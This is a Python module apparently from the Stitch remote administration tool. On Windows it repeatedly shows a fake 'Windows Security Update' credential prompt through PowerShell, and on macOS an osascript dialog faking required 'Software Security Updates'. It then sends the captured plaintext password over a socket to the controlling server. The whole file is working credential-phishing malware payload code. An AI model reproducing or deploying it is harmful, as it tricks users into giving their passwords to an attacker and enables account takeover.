# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import sys
import subprocess

response = ''
if win_client():
    while True:
        cmd1 = "$cred=$host.ui.promptforcredential('Windows Security Update','',[Environment]::UserName,[Environment]::UserDomainName);"
        cmd2 = 'echo $cred.getnetworkcredential().password;'
        full_cmd = 'Powershell "{} {}"'.format(cmd1,cmd2)
        response = run_command(full_cmd)
        if response.strip() != '' and not response.strip().startswith('[!]'): break
    response = '[+] Password: {}'.format(response.strip())
    send(client_socket,response)

if osx_client():
    while True:
        sftware = '/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns'
        alert = '/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns'
        if os.path.exists(sftware):
            cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon file \"/System/Library/CoreServices/Software Update.app/Contents/Resources/SoftwareUpdate.icns\" as alias' -e 'text returned of result'"
        elif os.path.exists(alert):
            cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon file \"/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/AlertCautionIcon.icns\" as alias' -e 'text returned of result'"
        else:
            cmd = "osascript -e 'Tell application \"System Events\" to display dialog \"Software Security Updates are required.\nTo update, please enter your password:\" buttons {\"OK\"} default button \"OK\" with hidden answer default answer \"\" with icon caution' -e 'text returned of result'"
        response=run_command(cmd)
        if response.strip() == '':
            cmd = "osascript -e 'Tell application \"System Events\" to display notification \"Software Security Updates are required.\nPlease enter your password.\" with title \"Apple Security\" '"
            cmd=run_command(cmd)
        else:
            response = "[+] Password: {}".format(response.strip())
            break

    send(client_socket,response)
